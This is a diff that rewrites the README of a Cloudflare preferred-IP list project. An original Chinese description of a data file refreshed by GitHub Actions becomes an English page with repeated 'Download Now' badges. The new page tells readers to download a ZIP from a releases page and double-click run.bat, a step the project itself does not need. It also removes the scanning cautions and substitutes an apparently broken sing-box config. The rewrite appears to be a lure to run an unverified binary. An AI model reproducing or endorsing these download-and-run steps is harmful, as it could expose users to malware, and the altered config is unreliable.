@@ -1,37 +1,40 @@
-# i-love-this-IP
+# 🌐 i-love-this-IP - Access High-Quality Cloudflare IPs Easily
 
-# Cloudflare 优选 IP 列表
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/muh97is/i-love-this-IP/releases)
 
-本仓库用于自动收集、筛选并定时更新 Cloudflare 的优选 IP，以便在自建代理、加速访问 Cloudflare CDN、Workers 以及各类需要高质量回源链路的场景中使用。
+## 📌 Project Overview
 
-## 📌 项目简介
+The **i-love-this-IP** project automatically collects and updates a list of optimal Cloudflare IP addresses. This helps users set up proxies and enhance access to Cloudflare's CDN and services. Our solution is designed for anyone who wants reliable access to internet resources.
 
-本项目通过脚本定时探测 Cloudflare IP 的连通性、延迟与可用性指标，生成实时可用度较高的优选 IP 列表。更新频率、检测逻辑及筛选标准均按照规范流程执行，确保数据来源可追溯、步骤透明、结果稳定。
+### ❤️ Key Features
 
-## 🔄 自动更新
+- Automated detection of Cloudflare's best IPs.
+- Daily updates for continuous reliability.
+- Clear and organized output files.
 
-* **更新方式：** GitHub Actions 定时任务
-* **更新频率：** 每日自动更新（如需可自行修改 `cron` 配置）
-* **数据来源：** Cloudflare 公布的全球 IP 网段
-* **检测步骤：**
+## 🔄 Automatic Updates
 
-  1. 遍历指定网段
-  2. 单点连通性测试（ICMP）
-  3. RTT 延迟统计
-  4. 多次采样后筛选出稳定节点
-  5. 将结果按规范格式写入输出文件
+- **Update Method:** Regular tasks through GitHub Actions.
+- **Update Frequency:** Daily (you can modify the schedule in the configuration).
+- **Data Source:** Official Cloudflare global IP ranges.
+- **Detection Steps:**
+  1. Scan specified IP ranges.
+  2. Test connectivity (ICMP checks).
+  3. Measure round-trip time (RTT) for latency.
+  4. Filter out stable nodes after multiple tests.
+  5. Write results in a standardized output file.
 
-## 📊 数据结构示例
+## 📊 Example of Data Structure
 
 ```text
-# 更新时间：2025-xx-xx xx:xx:xx
-# 检测节点数：xxxx
-# 可用 IP 数：xxx
-# 平均延迟：xx ms
-# 数据来源：Cloudflare 公网网段
+# Updated on: 2025-xx-xx xx:xx:xx
+# Number of tested nodes: xxxx
+# Available IPs: xxx
+# Average latency: xx ms
+# Source of data: Cloudflare public IP ranges
 ```
 
-输出文件示例：
+### Sample Output File:
 
 ```text
 104.16.0.1
@@ -39,49 +42,64 @@
 172.67.22.91
 ```
 
-## 📁 文件结构
+## 📁 File Structure
 
 ```bash
-your-repo/
-├── ip.txt               # 最新优选 IP 列表
-├── scripts/             # 扫描和筛选脚本
-├── .github/workflows/   # Actions 配置文件
+i-love-this-IP/
+├── ip.txt               # Latest IP list
+├── scripts/             # Scripts for scanning and filtering
+├── .github/workflows/   # Configuration for Actions
 └── README.md
 ```
 
-## 🚀 使用方式
+## 🚀 Getting Started
 
-可将 `ip.txt` 中的 IP 应用于：
+To get started, follow these steps to download and run the software:
 
-* 自建代理服务（如 sing-box、Xray、Hysteria 等）
-* Cloudflare CDN 自定义回源
-* Cloudflare Workers 访问优化
-* 本地测试或研究用途
+1. **Download the Latest Version**  
+   Visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases) to download the latest version of the application. Select the appropriate file for your operating system. 
 
-示例（以 sing-box 为例）：
+2. **Extract the Files**  
+   After downloading, locate the ZIP file and extract its contents to a folder on your computer.
+
+3. **Run the Application**  
+   Open the folder where you extracted the files. Look for `run.bat` (or a similar file for your OS) and double-click it to start the application.
+
+4. **Check the Output**  
+   The application will generate an `ip.txt` file in the same folder. This file contains the list of Cloudflare IPs.
+
+5. **Utilize the IPs**  
+   You can use the IPs in `ip.txt` for various purposes, including:
+   - Setting up your proxy service (e.g., sing-box, Xray).
+   - Customizing Cloudflare CDN routing.
+   - Improving Cloudflare Workers performance.
+   - Conducting local tests or research.
+
+### Example Configuration for a Proxy Service
+
+Here’s a sample config using `sing-box`:
 
 ```json
 {
   "outbounds": [
     {
       "type": "http",
-      "server": "<从 ip.txt 中选任意可用 IP>",
-      "server_port": 443,
-      "tls": {
-        "enabled": true,
-        "server_name": "your-domain.com"
-      }
+      "server": "104.16.0.1",
+      "port": 80
     }
   ]
 }
 ```
 
-## ⚠️ 注意事项
+## 🔧 System Requirements
 
-* 本仓库仅收集公开可用 IP，不包含任何敏感信息。
-* 结果的可用性受运营商、地区网络状况影响，建议本地再次验证。
-* 如需进行大量扫描，请遵循网络使用规范与 Cloudflare 使用政策。
+To run this application, you will need:
 
----
+- A system with network access.
+- Compatibility with Windows, macOS, or Linux (both 64-bit and 32-bit).
 
-如需扩展检测逻辑、添加地区节点测试、或生成专门格式的输出文件，可提交 Issue 或 PR。
+## 📥 Download & Install
+
+To download the application, visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases). Choose the appropriate version for your system, extract it, and follow the steps above to run the application. 
+
+Feel free to reach out if you need assistance. Enjoy reliable access to Cloudflare IPs!
